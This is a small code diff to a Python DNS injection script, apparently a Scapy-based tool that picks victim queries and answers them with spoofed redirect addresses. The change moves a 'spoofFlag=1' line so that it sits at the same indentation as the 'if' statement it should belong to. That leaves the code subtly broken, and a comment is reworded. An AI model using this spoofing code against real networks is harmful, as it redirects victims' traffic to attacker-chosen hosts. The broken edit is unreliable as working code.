@@ -16,8 +16,8 @@ def dns_inject(packet):
 	# ........................ Check which ones are victims..........................
 	# ........................ Get redirect_to .....................................
 	#print(packet)
-	spoofFlag=1
 	if(packet.haslayer(DNSQR) and packet[DNS].ancount==0):
+	spoofFlag=1
 		if(hostFlag==0):
 			domain = packet[DNS].qd.qname.decode('ASCII').rsplit('.', 1)[0]
 			if(domain in host.keys()):
@@ -42,7 +42,7 @@ if __name__ == '__main__':
 		#interface='ens33'
 		iFlag=1
 	if(hostfile==None):
-		## ....................Write code to get local machine IP address
+		## ....................To get local machine IP address
 		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 		try:
 			s.connect(('8.8.8.8', 80))
